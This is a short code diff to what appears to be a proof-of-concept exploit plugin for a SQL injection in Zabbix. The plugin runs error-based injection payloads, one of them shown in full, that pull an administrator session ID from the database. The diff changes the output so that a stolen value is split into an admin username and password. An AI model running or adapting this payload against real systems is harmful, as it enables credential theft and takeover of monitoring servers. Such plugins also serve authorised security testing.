@@ -66,11 +66,13 @@ class Zabbix(POCBase):
         session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
         res = self._sql_inject(passwd_sql)
         if res:
+            res = res.split(':')
             result['VerifyInfo'] = {}
             result['VerifyInfo']['URL'] = self.url
             result['VerifyInfo']['Payload'] = passwd_sql
             result['VerifyInfo']['Payload2'] = session_sql
-            result['AdminInfo']['Username'] = res
+            result['AdminInfo']['Username'] = res[0]
+            result['AdminInfo']['Password'] = res[1]
         return self.parse_output(result)
 
     def parse_output(self, result):
